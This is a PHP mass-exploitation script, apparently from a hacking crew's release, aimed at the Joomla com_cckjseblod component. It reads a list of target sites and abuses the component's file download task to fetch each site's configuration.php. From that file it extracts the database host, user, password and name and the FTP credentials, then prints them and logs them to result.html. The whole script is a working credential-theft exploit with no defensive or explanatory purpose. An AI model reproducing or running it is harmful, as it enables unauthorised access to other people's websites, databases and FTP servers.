<?php

@error_reporting(0);
@set_time_limit(0);

print "
  __   _  _  ____  __     ____  _  _  ____  __     __  __  ____ 
 / _\ / )( \(_  _)/  \   (  __)( \/ )(  _ \(  )   /  \(  )(_  _)
/    \) \/ (  )( (  O )   ) _)  )  (  ) __// (_/\(  O ))(   )(  
\_/\_/\____/ (__) \__/   (____)(_/\_)(__)  \____/ \__/(__) (__) 
                    
                    Thx to: Mr.MaGnoM
 JOOMLA COM_CCKJSEBLOD Auto EXploiter by 4WSec - Anon Cyber Team

" ;


$g=@file_get_contents($argv[1]);
$ss=explode("\r\n",$g);
$open=fopen("result.html","a");


foreach ($ss as $links){
  $lofe="$links/index.php?option=com_cckjseblod&task=download&file=configuration.php";
  $gg=@file_get_contents($lofe);
  if(preg_match("#class JConfig#",$gg)){
     echo "\n[+] $links ==> infected\n";fwrite($open,"<br>[+] $links <br>");
     preg_match("#tmp_path = '(.*?)\/tmp';#",$gg,$r);echo "    [-] Path : $r[1]/\n";fwrite($open,"Path: $r[1] <br>");

     echo "\t[*]>--database informations --< \n";  ///// database info
     preg_match("#host = '(.*?)';#",$gg,$r);echo "\t\t--=[ Host : $r[1]\n";fwrite($open,"host : $r[1] <br>");
     preg_match_all("#user = '(.*?)';#",$gg,$rr);echo "\t\t--=[ user : ".$rr[1][1]."\n";$aaa=$rr[1][1];fwrite($open,"user :$aaa <br>");
     preg_match("#password = '(.*?)';#",$gg,$r);echo "\t\t--=[ password : $r[1]\n";fwrite($open,"pass : $r[1] <br>");
     preg_match("#db = '(.*?)';#",$gg,$r);echo "\t\t--=[ Database : $r[1]\n";fwrite($open,"db: $r[1] <br>");

     echo "\t[*]>--Ftp informations --< \n";    /////// ftp info
     preg_match("#ftp_enable = '(.*?)';#",$gg,$r);echo "\t\t--=[ ftp enable : $r[1]\n";
     preg_match("#ftp_host = '(.*?)';#",$gg,$r);echo "\t\t--=[ ftp_host : $r[1]\n";fwrite($open,"ftp-host : $r[1] <br>");
     preg_match("#ftp_port = '(.*?)';#",$gg,$r);echo "\t\t--=[ ftp port : $r[1]\n";fwrite($open,"ftp-port : $r[1] <br>");
     preg_match("#ftp_user = '(.*?)';#",$gg,$r);echo "\t\t--=[ ftp user : $r[1]\n";fwrite($open,"ftp-user : $r[1] <br>");
     preg_match("#ftp_pass = '(.*?)';#",$gg,$r);echo "\t\t--=[ ftp pass : $r[1]\n";fwrite($open,"ftp-pass : $r[1] <br>");
     preg_match("#ftp_root = '(.*?)';#",$gg,$r);echo "\t\t--=[ ftp root : $r[1]\n";
  }else{
    echo "\n[+] $links ==> Tidak Terinfeksi\n";
  }
}
fclose($open);
?>
